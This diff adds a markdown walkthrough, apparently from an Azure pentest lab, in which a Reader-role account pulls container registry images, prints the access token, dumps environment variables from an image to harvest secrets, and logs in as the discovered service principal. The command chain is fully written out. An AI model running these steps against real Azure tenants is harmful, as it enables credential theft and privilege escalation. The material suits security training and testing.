@@ -1,0 +1,30 @@
+- Reader permissions can pull container images
+	- Authenticate as Reader
+		- `az login -u readeruser@<DOMAIN> -p myPassword123`
+	- List container registries - note the name
+		- `az acr list -o table`
+	- Generate a Docker login and connect to the registry
+		- `acr=ACR_NAME`
+		- `loginserver=$(az acr login -n $acr --expose-token --query loginServer -o tsv)`
+		- `accesstoken=$(az acr login -n $acr --expose-token --query accessToken -o tsv)`
+		- `docker login $loginserver -u 00000000-0000-0000-0000-000000000000 -p $accesstoken`
+	- List images in the container registry
+		- `az acr repository list -n $acr`
+	- Enumerate versions by listing tags for an image
+		- `az acr repository show-tags -n $acr --repository nodeapp-web`
+	- Note registry credentials in session
+		- `echo $loginserver`
+		- `echo $accesstoken`
+	- Open a PowerShell console as Administrator and set variables (if necessary based on Windows version)
+		- `$loginserver="<LOGIN_SERVER>"`
+		- `$accesstoken="<ACCESS_TOKEN>"`
+	- Login to Docker from PowerShell
+		- ` docker login $loginserver -u 00000000-0000-0000-0000-000000000000 -p $accesstoken`
+	- Pull the image
+		- `docker pull $loginserver/nodeapp-web:v1`
+	- Examine the image for sensitive information (list env vars)
+		- `docker container run --rm $loginserver/nodeapp-web:v1 env`
+	- Login with found credentials via Azure CLI
+		- `az login --service-principal --username APP_ID --password SECRET_KEY --tenant TENANT_ID`
+	- Check role assignment and scope
+		- `az role assignment list --assignee APP_ID --include-groups --include-inherited --query '[].{username:principalName, role:roleDefinitionName, usertype:principalType, scope:scope}'`
